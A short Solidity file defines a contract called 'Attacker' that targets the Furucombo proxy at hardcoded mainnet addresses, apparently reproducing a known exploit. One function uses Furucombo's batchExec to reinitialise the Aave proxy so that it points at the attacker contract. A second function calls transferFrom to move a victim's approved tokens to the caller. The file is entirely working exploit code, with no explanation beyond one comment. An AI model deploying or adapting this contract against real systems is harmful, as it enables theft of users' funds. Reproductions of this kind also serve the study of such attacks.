// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { IERC20 } from '@openzeppelin/contracts/token/ERC20/IERC20.sol';

import { IProxy, IAaveProxy } from './Furucombo.sol';

contract Attacker {
	IProxy public constant furucombo = IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
	IAaveProxy public constant aaveProxy = IAaveProxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

	function attackSetup() external {
		address[] memory tos = new address[](1);
		bytes32[] memory configs = new bytes32[](1);
		bytes[] memory datas = new bytes[](1);

		// 初始化 aave proxy，讓 implementation 為此合約
		tos[0] = address(aaveProxy);
		datas[0] = abi.encodeWithSelector(aaveProxy.initialize.selector, address(this), '');

		furucombo.batchExec(tos, configs, datas);
	}

	function attackExcute(
		IERC20 token,
		address victim,
		uint256 amount
	) external {
		token.transferFrom(victim, tx.origin, amount);
	}
}
